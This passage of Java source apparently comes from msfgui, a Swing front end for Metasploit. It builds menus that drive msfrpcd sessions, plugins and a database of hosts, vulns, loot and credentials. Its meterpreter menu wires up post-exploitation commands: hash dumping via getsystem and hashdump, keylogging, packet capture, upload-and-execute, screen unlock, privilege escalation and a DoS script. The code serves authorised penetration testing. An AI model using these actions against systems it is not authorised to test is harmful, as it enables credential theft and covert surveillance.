        logGenerateMenuItem.setName("logGenerateMenuItem"); // NOI18N
        logGenerateMenuItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                logGenerateMenuItemActionPerformed(evt);
            }
        });
        postMenu.add(logGenerateMenuItem);

        menuBar.add(postMenu);

        consoleMenu.setMnemonic('C');
        consoleMenu.setText(resourceMap.getString("consoleMenu.text")); // NOI18N
        consoleMenu.setEnabled(false);
        consoleMenu.setName("consoleMenu"); // NOI18N

        newConsoleItem.setText(resourceMap.getString("newConsoleItem.text")); // NOI18N
        newConsoleItem.setName("newConsoleItem"); // NOI18N
        newConsoleItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                newConsoleItemActionPerformed(evt);
            }
        });
        consoleMenu.add(newConsoleItem);

        existingConsoleMenu.setText(resourceMap.getString("existingConsoleMenu.text")); // NOI18N
        existingConsoleMenu.setName("existingConsoleMenu"); // NOI18N
        consoleMenu.add(existingConsoleMenu);

        closeConsoleMenu.setText(resourceMap.getString("closeConsoleMenu.text")); // NOI18N
        closeConsoleMenu.setName("closeConsoleMenu"); // NOI18N
        consoleMenu.add(closeConsoleMenu);

        refreshConsolesItem.setText(resourceMap.getString("refreshConsolesItem.text")); // NOI18N
        refreshConsolesItem.setName("refreshConsolesItem"); // NOI18N
        refreshConsolesItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                refreshConsolesItemActionPerformed(evt);
            }
        });
        consoleMenu.add(refreshConsolesItem);

        menuBar.add(consoleMenu);

        databaseMenu.setMnemonic('D');
        databaseMenu.setText(resourceMap.getString("databaseMenu.text")); // NOI18N
        databaseMenu.setEnabled(false);
        databaseMenu.setName("databaseMenu"); // NOI18N

        connectItem.setMnemonic('C');
        connectItem.setText(resourceMap.getString("connectItem.text")); // NOI18N
        connectItem.setName("connectItem"); // NOI18N
        connectItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                connectItemActionPerformed(evt);
            }
        });
        databaseMenu.add(connectItem);

        disconnectItem.setMnemonic('D');
        disconnectItem.setText(resourceMap.getString("disconnectItem.text")); // NOI18N
        disconnectItem.setName("disconnectItem"); // NOI18N
        disconnectItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                disconnectItemActionPerformed(evt);
            }
        });
        databaseMenu.add(disconnectItem);

        refreshItem.setMnemonic('R');
        refreshItem.setText(resourceMap.getString("refreshItem.text")); // NOI18N
        refreshItem.setName("refreshItem"); // NOI18N
        refreshItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                refreshItemActionPerformed(evt);
            }
        });
        databaseMenu.add(refreshItem);

        importItem.setMnemonic('I');
        importItem.setText(resourceMap.getString("importItem.text")); // NOI18N
        importItem.setName("importItem"); // NOI18N
        importItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                importItemActionPerformed(evt);
            }
        });
        databaseMenu.add(importItem);

        currWorkspaceItem.setMnemonic('W');
        currWorkspaceItem.setText(resourceMap.getString("currWorkspaceItem.text")); // NOI18N
        currWorkspaceItem.setName("currWorkspaceItem"); // NOI18N
        currWorkspaceItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                currWorkspaceItemActionPerformed(evt);
            }
        });
        databaseMenu.add(currWorkspaceItem);

        addWorkspaceItem.setMnemonic('A');
        addWorkspaceItem.setText(resourceMap.getString("addWorkspaceItem.text")); // NOI18N
        addWorkspaceItem.setName("addWorkspaceItem"); // NOI18N
        addWorkspaceItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                addWorkspaceItemActionPerformed(evt);
            }
        });
        databaseMenu.add(addWorkspaceItem);

        delWorkspaceItem.setMnemonic('l');
        delWorkspaceItem.setText(resourceMap.getString("delWorkspaceItem.text")); // NOI18N
        delWorkspaceItem.setName("delWorkspaceItem"); // NOI18N
        delWorkspaceItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                delWorkspaceItemActionPerformed(evt);
            }
        });
        databaseMenu.add(delWorkspaceItem);

        menuBar.add(databaseMenu);

        pluginsMenu.setMnemonic('l');
        pluginsMenu.setText(resourceMap.getString("pluginsMenu.text")); // NOI18N
        pluginsMenu.setEnabled(false);
        pluginsMenu.setName("pluginsMenu"); // NOI18N

        autoAddRouteItem.setMnemonic('A');
        autoAddRouteItem.setText(resourceMap.getString("autoAddRouteItem.text")); // NOI18N
        autoAddRouteItem.setName("autoAddRouteItem"); // NOI18N
        autoAddRouteItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                autoAddRouteItemActionPerformed(evt);
            }
        });
        pluginsMenu.add(autoAddRouteItem);

        soundItem.setMnemonic('S');
        soundItem.setText(resourceMap.getString("soundItem.text")); // NOI18N
        soundItem.setName("soundItem"); // NOI18N
        soundItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                soundItemActionPerformed(evt);
            }
        });
        pluginsMenu.add(soundItem);

        dbCredcollectItem.setMnemonic('c');
        dbCredcollectItem.setText(resourceMap.getString("dbCredcollectItem.text")); // NOI18N
        dbCredcollectItem.setName("dbCredcollectItem"); // NOI18N
        dbCredcollectItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                dbCredcollectItemActionPerformed(evt);
            }
        });
        pluginsMenu.add(dbCredcollectItem);

        dbTrackerItem.setMnemonic('t');
        dbTrackerItem.setText(resourceMap.getString("dbTrackerItem.text")); // NOI18N
        dbTrackerItem.setName("dbTrackerItem"); // NOI18N
        dbTrackerItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                dbTrackerItemActionPerformed(evt);
            }
        });
        pluginsMenu.add(dbTrackerItem);

        socketLoggerItem.setMnemonic('k');
        socketLoggerItem.setText(resourceMap.getString("socketLoggerItem.text")); // NOI18N
        socketLoggerItem.setName("socketLoggerItem"); // NOI18N
        socketLoggerItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                socketLoggerItemActionPerformed(evt);
            }
        });
        pluginsMenu.add(socketLoggerItem);

        ipsFilterItem.setMnemonic('I');
        ipsFilterItem.setText(resourceMap.getString("ipsFilterItem.text")); // NOI18N
        ipsFilterItem.setName("ipsFilterItem"); // NOI18N
        ipsFilterItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                ipsFilterItemActionPerformed(evt);
            }
        });
        pluginsMenu.add(ipsFilterItem);

        otherPluginItem.setMnemonic('O');
        otherPluginItem.setText(resourceMap.getString("otherPluginItem.text")); // NOI18N
        otherPluginItem.setName("otherPluginItem"); // NOI18N
        otherPluginItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                otherPluginItemActionPerformed(evt);
            }
        });
        pluginsMenu.add(otherPluginItem);

        unloadPluginItem.setMnemonic('U');
        unloadPluginItem.setText(resourceMap.getString("unloadPluginItem.text")); // NOI18N
        unloadPluginItem.setName("unloadPluginItem"); // NOI18N
        unloadPluginItem.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                unloadPluginItemActionPerformed(evt);
            }
        });
        pluginsMenu.add(unloadPluginItem);

        menuBar.add(pluginsMenu);

        helpMenu.setMnemonic('H');
        helpMenu.setText(resourceMap.getString("helpMenu.text")); // NOI18N
        helpMenu.setName("helpMenu"); // NOI18N

        onlineHelpMenu.setMnemonic('O');
        onlineHelpMenu.setText(resourceMap.getString("onlineHelpMenu.text")); // NOI18N
        onlineHelpMenu.setName("onlineHelpMenu"); // NOI18N
        onlineHelpMenu.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                onlineHelpMenuActionPerformed(evt);
            }
        });
        helpMenu.add(onlineHelpMenu);

        aboutMenuItem.setAction(actionMap.get("showAboutBox")); // NOI18N
        aboutMenuItem.setName("aboutMenuItem"); // NOI18N
        helpMenu.add(aboutMenuItem);

        menuBar.add(helpMenu);

        statusPanel.setName("statusPanel"); // NOI18N

        statusMessageLabel.setName("statusMessageLabel"); // NOI18N

        statusAnimationLabel.setHorizontalAlignment(javax.swing.SwingConstants.LEFT);
        statusAnimationLabel.setName("statusAnimationLabel"); // NOI18N

        progressBar.setName("progressBar"); // NOI18N

        javax.swing.GroupLayout statusPanelLayout = new javax.swing.GroupLayout(statusPanel);
        statusPanel.setLayout(statusPanelLayout);
        statusPanelLayout.setHorizontalGroup(
            statusPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(statusPanelLayout.createSequentialGroup()
                .addContainerGap()
                .addComponent(statusMessageLabel)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 696, Short.MAX_VALUE)
                .addComponent(progressBar, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(statusAnimationLabel)
                .addContainerGap())
        );
        statusPanelLayout.setVerticalGroup(
            statusPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, statusPanelLayout.createSequentialGroup()
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addGroup(statusPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(statusMessageLabel)
                    .addComponent(statusAnimationLabel)
                    .addComponent(progressBar, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(12, 12, 12))
        );

        setComponent(mainPanel);
        setMenuBar(menuBar);
        setStatusBar(statusPanel);
    }// </editor-fold>//GEN-END:initComponents

	private void exitMenuItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_exitMenuItemActionPerformed
		confirmStop();
		System.exit(0);
	}//GEN-LAST:event_exitMenuItemActionPerformed

	private void connectRpcMenuItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_connectRpcMenuItemActionPerformed
		connectRpc();
	}//GEN-LAST:event_connectRpcMenuItemActionPerformed

	private void clearHistoryItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_clearHistoryItemActionPerformed
		MsfguiApp.clearHistory(recentMenu);
	}//GEN-LAST:event_clearHistoryItemActionPerformed

	private void onlineHelpMenuActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_onlineHelpMenuActionPerformed
		try{
			java.awt.Desktop.getDesktop().browse(new URI("http://www.metasploit.com/framework/support"));
		} catch (IOException ex){
			JOptionPane.showMessageDialog(this.getFrame(), "Can't open browser. See http://www.metasploit.com/framework/support");
		} catch ( URISyntaxException usx){
			JOptionPane.showMessageDialog(this.getFrame(), "Can't find the URL. This really should never happen. Report this bug.");
		}
	}//GEN-LAST:event_onlineHelpMenuActionPerformed

	private void logGenerateMenuItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_logGenerateMenuItemActionPerformed
		try{
			java.awt.Desktop.getDesktop().browse(new URI("file://"+MsfguiApp.cleanBackslashes(MsfguiLog.defaultLog.save())));
		}catch (Exception iox){
			MsfguiApp.fileChooser.setCurrentDirectory(new File(MsfguiApp.getTempFolder()));
			MsfguiApp.fileChooser.setSelectedFile(new File("msfguilog.html"));
			try{
				if(MsfguiApp.fileChooser.showSaveDialog(this.getFrame()) == JFileChooser.APPROVE_OPTION)
					java.awt.Desktop.getDesktop().browse(new URI("file://"+MsfguiLog.defaultLog.save(
							MsfguiApp.cleanBackslashes(MsfguiApp.fileChooser.getSelectedFile().getAbsolutePath()))));
			}catch (Exception ex){
				JOptionPane.showMessageDialog(getFrame(), "Problem "+ex);
			}
		}
	}//GEN-LAST:event_logGenerateMenuItemActionPerformed

	private void killSessionsMenuItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_killSessionsMenuItemActionPerformed
		for( Object sesObj : sessionsTableModel.sessions ){
			try{
				rpcConn.execute("session.stop", ((Map)sesObj).get("id"));
			} catch (MsfException xre) {
				statusMessageLabel.setText("Error killing session "+((Map)sesObj).get("id"));
			}
		}
	}//GEN-LAST:event_killSessionsMenuItemActionPerformed

	private void changeLFMenuItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_changeLFMenuItemActionPerformed
		setLnF(true);
	}//GEN-LAST:event_changeLFMenuItemActionPerformed

	private void collectedCredsMenuItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_collectedCredsMenuItemActionPerformed
		new EditorWindow(MsfguiLog.defaultLog.getHashes()).setVisible(true);
	}//GEN-LAST:event_collectedCredsMenuItemActionPerformed

	private void newConsoleItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_newConsoleItemActionPerformed
		try{
			Map res = (Map)rpcConn.execute("console.create");
			registerConsole(res, true, "");
		}catch(MsfException mex){
			JOptionPane.showMessageDialog(getFrame(), mex);
		}
}//GEN-LAST:event_newConsoleItemActionPerformed

	private void searchItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_searchItemActionPerformed
		searchWin.setVisible(true);
	}//GEN-LAST:event_searchItemActionPerformed

	private void connectItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_connectItemActionPerformed
		if(DbConnectDialog.connect(getFrame(), rpcConn))
			reloadDb();
	}//GEN-LAST:event_connectItemActionPerformed

	/** Refreshes the database tables. */
	private void reloadDb() {
		try {
			MsfguiApp.workspace = ((Map) rpcConn.execute("db.current_workspace")).get("workspace").toString();
			reAdd(eventsTable,6,(Object[]) ((Map)rpcConn.execute("db.events",MsfguiApp.workspace)).get("events"),
					new String[]{"host","created_at","updated_at","name","critical","username","info"});
			reAdd(lootsTable,8,(Object[]) ((Map)rpcConn.execute("db.loots",MsfguiApp.workspace)).get("loots"),
					new String[]{"host","service","ltype","ctype","data","created_at","updated_at","name","info"});
		} catch (MsfException mex) {
		}
		reAddQuery(hostsTable,2,"hosts",new String[]{"created_at","address","address6","mac","name","state","os_name",
						"os_flavor","os_sp","os_lang","updated_at","purpose","info"});
		reAddQuery(clientsTable,3,"clients",new String[]{"host","ua_string","ua_name","ua_ver","created_at","updated_at"});
		reAddQuery(servicesTable, 4, "services", new String[]{"host","created_at","updated_at","port","proto","state","name","info"});
		reAddQuery(vulnsTable,5,"vulns",new String[]{"port","proto","time","host","name","refs"});
		reAddQuery(notesTable,7,"notes",new String[]{"time", "host", "service", "type", "data"});
	}

	private void refreshItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_refreshItemActionPerformed
		reloadDb();
	}//GEN-LAST:event_refreshItemActionPerformed

	private void importItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_importItemActionPerformed
		try {
			Object filetype = JOptionPane.showInputDialog(getFrame(), "Select file type. Autodetect recommended.",
					"Type selection", JOptionPane.PLAIN_MESSAGE,null, new Object[]{"Autodetect","Msfe XML",
					"Nexpose simpleXML","Nexpose rawXML", "Nmap XML", "Nessuse NBE","Nessus XML", "Nessus XML v2",
					"Qualsys XML", "IP list", "Amap log", "Amap mlog"}, onlineHelpMenu);
			String type;
			if(filetype == null)
				return;
			else if(filetype.equals("Autodetect"))
				type = "data";
			else
				type = filetype.toString().toLowerCase().replaceAll(" ", "_");
			HashMap argHash = new HashMap();
			if (MsfguiApp.fileChooser.showOpenDialog(getFrame()) == javax.swing.JFileChooser.CANCEL_OPTION)
				return;
			int fsize = (int)MsfguiApp.fileChooser.getSelectedFile().length();
			FileInputStream fin = new FileInputStream(MsfguiApp.fileChooser.getSelectedFile());
			byte[] data = new byte[fsize];
			fin.read(data);
			argHash.put("data", Base64.encode(data));
			rpcConn.execute("db.import_"+type,argHash);
		} catch (MsfException mex) {
			JOptionPane.showMessageDialog(getFrame(), mex);
		} catch (IOException iex) {
			JOptionPane.showMessageDialog(getFrame(), iex);
		}
	}//GEN-LAST:event_importItemActionPerformed

	private void disconnectItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_disconnectItemActionPerformed
		try {
			rpcConn.execute("db.disconnect");
		} catch (MsfException mex) {
			JOptionPane.showMessageDialog(getFrame(), mex);
		}
	}//GEN-LAST:event_disconnectItemActionPerformed

	private void loadPlugin(String plugin){
		try {
			rpcConn.execute("plugin.load",plugin, new HashMap());
			JOptionPane.showMessageDialog(getFrame(), "Plugin "+plugin+" loaded.");
		} catch (MsfException mex) {
			JOptionPane.showMessageDialog(getFrame(), mex);
		}
	}
	private void otherPluginItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_otherPluginItemActionPerformed
		String plugin = JOptionPane.showInputDialog(getFrame(),"Enter the name of a plugin","Plugin loader",JOptionPane.QUESTION_MESSAGE);
		if(plugin != null && plugin.length() > 0)
			loadPlugin(plugin);
	}//GEN-LAST:event_otherPluginItemActionPerformed

	private void ipsFilterItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_ipsFilterItemActionPerformed
		loadPlugin("ips_filter");
	}//GEN-LAST:event_ipsFilterItemActionPerformed

	private void socketLoggerItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_socketLoggerItemActionPerformed
		loadPlugin("socket_logger");
	}//GEN-LAST:event_socketLoggerItemActionPerformed

	private void dbTrackerItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_dbTrackerItemActionPerformed
		loadPlugin("db_tracker");
	}//GEN-LAST:event_dbTrackerItemActionPerformed

	private void soundItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_soundItemActionPerformed
		loadPlugin("sounds");
	}//GEN-LAST:event_soundItemActionPerformed

	private void autoAddRouteItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_autoAddRouteItemActionPerformed
		loadPlugin("auto_add_route");
	}//GEN-LAST:event_autoAddRouteItemActionPerformed

	private void dbCredcollectItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_dbCredcollectItemActionPerformed
		loadPlugin("db_credcollect");
	}//GEN-LAST:event_dbCredcollectItemActionPerformed

	private void unloadPluginItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_unloadPluginItemActionPerformed
		try {
			Object[] plugins = (Object[])((Map)rpcConn.execute("plugin.loaded")).get("plugins");
			Object plugin = JOptionPane.showInputDialog(getFrame(), "Choose a plugin to unload", "Unload plugin",
					JOptionPane.PLAIN_MESSAGE, null, plugins, plugins[0]);
			if(plugin == null)
				return;
			rpcConn.execute("plugin.unload",plugin);
		} catch (MsfException mex) {
			JOptionPane.showMessageDialog(getFrame(), mex);
		}
	}//GEN-LAST:event_unloadPluginItemActionPerformed

	private void showDetailsItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_showDetailsItemActionPerformed
		JOptionPane.showMessageDialog(getFrame(), rpcConn.toString(), "Connection Details", JOptionPane.INFORMATION_MESSAGE);
	}//GEN-LAST:event_showDetailsItemActionPerformed

	private String[] tableShortNames = new String[]{"","",};
	private void tableDelCheck(KeyEvent evt, String name, int tabIndex, String[] colNames){
		if(evt.getKeyCode() != KeyEvent.VK_DELETE)
			return;
		JTable tab = (JTable)evt.getSource();
		for(int row : tab.getSelectedRows()){
			try {
				HashMap map = new HashMap();
				for(int i = 0; i < colNames.length; i++)
					map.put(colNames[i], tab.getValueAt(row,i));
				rpcConn.execute("db.del_"+name,map);
			} catch (MsfException mex) {
				JOptionPane.showMessageDialog(getFrame(), mex);
			}
		}//delete then readd
		reAddQuery(tab,tabIndex,name+"s",colNames);
	}
	private void hostsTableKeyReleased(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_hostsTableKeyReleased
		tableDelCheck(evt,"host",2,new String[]{"created_at","address","address6","mac","name","state","os_name",
				"os_flavor","os_sp","os_lang","updated_at","purpose","info"});
	}//GEN-LAST:event_hostsTableKeyReleased

	private void servicesTableKeyReleased(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_servicesTableKeyReleased
		tableDelCheck(evt,"service",4,new String[]{"host","created_at","updated_at","port","proto","state","name","info"});
	}//GEN-LAST:event_servicesTableKeyReleased

	private void vulnsTableKeyReleased(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_vulnsTableKeyReleased
		tableDelCheck(evt,"vuln",5,new String[]{"port","proto","time","host","name","refs"});
	}//GEN-LAST:event_vulnsTableKeyReleased

	private void notesTableKeyReleased(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_notesTableKeyReleased
		tableDelCheck(evt,"note",7,new String[]{"time", "host", "service", "type", "data"});
	}//GEN-LAST:event_notesTableKeyReleased

	private void lootsTableKeyReleased(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_lootsTableKeyReleased
		reAddQuery(lootsTable,8,"loots",new String[]{"host","service","ltype","ctype","data","created_at","updated_at","name","info"});
	}//GEN-LAST:event_lootsTableKeyReleased

	private void clientsTableKeyReleased(java.awt.event.KeyEvent evt) {//GEN-FIRST:event_clientsTableKeyReleased
		tableDelCheck(evt,"client",3,new String[]{"host","ua_string","ua_name","ua_ver","created_at","updated_at"});
	}//GEN-LAST:event_clientsTableKeyReleased

	private void currWorkspaceItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_currWorkspaceItemActionPerformed
		try {
			Object[] vals = (Object[])((Map)rpcConn.execute("db.workspaces")).get("workspaces");
			Object[] names = new Object[vals.length];
			for(int i = 0; i < vals.length; i++)
				names[i] = ((Map)vals[i]).get("name");
			Object selected = JOptionPane.showInputDialog(getFrame(),"Select a workspace","Workspace selection",
					JOptionPane.QUESTION_MESSAGE,null, names, MsfguiApp.workspace);
			if(selected == null)
				return;
			MsfguiApp.workspace = selected.toString();
			rpcConn.execute("db.set_workspace", MsfguiApp.workspace);
			reloadDb();
		} catch (MsfException mex) {
			JOptionPane.showMessageDialog(getFrame(), mex);
		}
	}//GEN-LAST:event_currWorkspaceItemActionPerformed

	private void addWorkspaceItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_addWorkspaceItemActionPerformed
		try {
			String name = JOptionPane.showInputDialog(getFrame(), "Enter a name for the new workspace");
			if(name != null)
				rpcConn.execute("db.add_workspace",name);
			MsfguiApp.workspace = name;
			rpcConn.execute("db.set_workspace", name);
			reloadDb();
		} catch (MsfException mex) {
			JOptionPane.showMessageDialog(getFrame(), mex);
		}
	}//GEN-LAST:event_addWorkspaceItemActionPerformed

	private void delWorkspaceItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_delWorkspaceItemActionPerformed
		try {
			Object[] vals = (Object[])((Map)rpcConn.execute("db.workspaces")).get("workspaces");
			Object[] names = new Object[vals.length];
			for(int i = 0; i < vals.length; i++)
				names[i] = ((Map)vals[i]).get("name");
			Object selected = JOptionPane.showInputDialog(getFrame(),"Select a workspace to delete","Workspace selection",
					JOptionPane.QUESTION_MESSAGE,null, names, MsfguiApp.workspace);
			if(selected == null)
				return;
			rpcConn.execute("db.del_workspace", selected.toString());
			if(MsfguiApp.workspace.equals(selected.toString())){
				MsfguiApp.workspace = "default";
				reloadDb();
			}
		} catch (MsfException mex) {
			JOptionPane.showMessageDialog(getFrame(), mex);
		}
	}//GEN-LAST:event_delWorkspaceItemActionPerformed

	private void refreshConsolesItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_refreshConsolesItemActionPerformed
		refreshConsoles();
	}//GEN-LAST:event_refreshConsolesItemActionPerformed

	/** Runs command on all current meterpreter sessions in new thread; posting updates for each thread */
	private void runOnAllMeterpreters(String cmd, String output, JLabel outputLabel) {
		SessionCommand.runOnAllMeterpreters(sessionsTableModel, cmd, output, outputLabel, rpcConn);
	}

   /** Displays a dialog to connect to msfrpcd. */
	private void connectRpc() {
		//make new rpcConnection
		rpcConn = OpenConnectionDialog.getConnection(this);
		if(rpcConn != null)
			getModules();
	}

   /** Attempts to start msfrpcd and connect to it.*/
	@Action
	public Task startRpc() {
		return RpcConnection.startRpcConn(this);
	}
	public void showInteractWindow() {
		for(Map session : selectedSessions)
			((InteractWindow)(sessionPopupMap.get(session.get("uuid")))).setVisible(true);
	}
	/* Master function to setup popup menus for jobs and sessions
	 * First handles jobs, then shell sessions, then meterpreter sessions,
	 * and finally other sessions (like VNC).
	 */
	private void setupPopupMenus() throws HeadlessException {
		//JOB POPUP MENUS
		jobPopupMenu = new JPopupMenu();
		addSessionItem("Info",jobPopupMenu,new RpcAction() {
			public void action() throws Exception {
				Object obj = ((Map)rpcConn.execute("job.info", clickedJob)).get("info");
				(new JobInfoPopup(null, true, obj)).setVisible(true);
			}
		});
		addSessionItem("Stop",jobPopupMenu,new RpcAction() {
			public void action() throws Exception {
				if(!((Map)rpcConn.execute("job.stop", clickedJob)).get("result").equals("success"))
					JOptionPane.showMessageDialog(null, "stop failed.");
			}
		});
		jobsList.addMouseListener( new PopupMouseListener() {
			public void doubleClicked(MouseEvent e){ //show interaction window on double-click
				try{
					Object obj = ((Map)rpcConn.execute("job.info", clickedJob)).get("info");
					(new JobInfoPopup(null, true, obj)).setVisible(true);
				}catch (MsfException xre) {
					JOptionPane.showMessageDialog(null, "info failed " + xre);
				}
			}
			public void showPopup(MouseEvent e) {
				int indx = jobsList.locationToIndex(e.getPoint());
				if(indx == -1)
					return;
				jobsList.setSelectedIndex(indx);
				clickedJob = jobsList.getSelectedValue().toString().split(" ")[0];
				if(e.isPopupTrigger())
					jobPopupMenu.show(jobsList, e.getX(), e.getY() );
			}
		});
		//SESSION POPUP MENUS
		sessionsTable.addMouseListener(new PopupMouseListener() {
			public void doubleClicked(MouseEvent e){
				getSelected();
				showInteractWindow();//show interaction window on double-click
			}
			private void getSelected() {
				int[] selrows = sessionsTable.getSelectedRows();
				selectedSessions = new HashMap[selrows.length];
				for (int i = 0; i < selrows.length; i++) 
					selectedSessions[i] = (Map) sessionsTableModel.getSessionList().get(selrows[i]);
			}
			public void showPopup(MouseEvent e) {
				if (!e.isPopupTrigger())
					return;
				getSelected();
				if(selectedSessions.length == 0) //must have a row selected
					return;
				Map session = selectedSessions[0];
				if (session.get("type").equals("shell"))
					shellPopupMenu.show(e.getComponent(), e.getX(), e.getY());
				else if (session.get("type").equals("meterpreter"))
					meterpreterPopupMenu.show(e.getComponent(), e.getX(),e.getY());
				else
					sessionPopupMenu.show(e.getComponent(), e.getX(),e.getY());
			}
		});

		//Setup shell popup menu
		shellPopupMenu = new JPopupMenu();
		addSessionItem("Interact",shellPopupMenu,null);
		addSessionItem("Upgrade",shellPopupMenu,new RpcAction(this) {
			String[] vals = null;
			public void action(Map session) throws Exception {
				if(vals == null)
					vals = JOptionPane.showInputDialog(getFrame(), "Select host/port for connect back.",
							session.get("tunnel_local").toString().split(":")[0]+":4444").split(":");
				rpcConn.execute("session.shell_upgrade", session.get("id"), vals[0], vals[1]);
			}
		});
		addSessionKillItem(shellPopupMenu);

		//Setup meterpreter menu
		meterpreterPopupMenu = new JPopupMenu();
		addSessionItem("Access Filesystem",meterpreterPopupMenu,new RpcAction(this) {
			public void action(Map session) throws Exception {
				new MeterpFileBrowser(rpcConn, session, sessionPopupMap).setVisible(true);
			}
		});
		addSessionItem("Processes",meterpreterPopupMenu,new RpcAction(this) {
			public void action(Map session) throws Exception {
				new ProcessList(rpcConn,session,sessionPopupMap).setVisible(true);
			}
		});
		addScript("Shell",meterpreterPopupMenu,new RpcAction(this) {
			public void action(Map session) throws Exception {
				rpcConn.execute("session.meterpreter_write", session.get("id"),
						Base64.encode("shell\n".getBytes()));
			}
		});
		addSessionItem("Console",meterpreterPopupMenu,null);
		addScript("Get hashes",meterpreterPopupMenu,
				"multi_console_command -cl \"use priv\",\"getsystem\",\"run hashdump.rb\"");
		final MainFrame mf = this;
		addSessionItem("Route through this session",meterpreterPopupMenu,new AutorouteOptionsDialog(mf, true));
		addScript("Schedule command",meterpreterPopupMenu,new ScheduleTaskOptionsDialog(getFrame()));
		addSessionItem("Unlock screen",meterpreterPopupMenu,"screen_unlock");
		addScript("Upload + execute",meterpreterPopupMenu,new UploadexecOptionsDialog(getFrame()));
		addSessionItem("Ping/DNS sweep",meterpreterPopupMenu,new NetenumOptionsDialog(getFrame()));
		addScript("Run shell commands",meterpreterPopupMenu,new MulticommandOptionsDialog(getFrame()));
		addSessionItem("VirtualBox sysenter DoS",meterpreterPopupMenu,"virtualbox_sysenter_dos");

		JMenu monitorMenu = new JMenu("Monitor");
		meterpreterPopupMenu.add(monitorMenu);
		addScript("Start keylogger",monitorMenu,"keylogrecorder");
		addScript("Start packet recorder",monitorMenu,"packetrecorder");
		addScript("Screenshot",monitorMenu,new RpcAction(this) {
			public void action(Map session) throws Exception {
				rpcConn.execute("session.meterpreter_write", session.get("id"),
						Base64.encode("screenshot\n".getBytes()));
			}
		});

		JMenu escalateMenu = new JMenu("Privilege escalation");
		meterpreterPopupMenu.add(escalateMenu);
		addSessionItem("Start system session with HP PML Driver permission vulnerability",escalateMenu,
				"pml_driver_config");
